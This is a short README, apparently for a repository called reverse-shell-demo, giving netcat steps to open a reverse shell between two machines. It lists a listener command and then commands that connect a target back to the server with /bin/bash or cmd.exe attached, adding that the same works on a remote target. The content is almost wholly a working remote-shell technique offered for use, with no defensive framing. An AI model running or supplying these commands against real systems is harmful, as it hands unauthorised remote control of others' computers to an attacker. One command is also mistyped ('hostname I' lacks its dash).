# reverse-shell-demo

## Reverse Shell demo between 2 computers on the same network. (Can be done on a remote target but local targets are faster for a demo, result is identical)

### 1) Install NetCat/Nmap


### 2) Set up a listening server:
`ncat -lvnp <port>`


### 3) Connect attack target to server:
For Linux/Bash:
`ncat <server-internal-ip> <port> -e /bin/bash`

For Windows:
`ncat <server-internal-ip> <port> -e cmd.exe`

*To find the internal IP run `hostname I` on Linux OR `ipconfig` on Windows.*
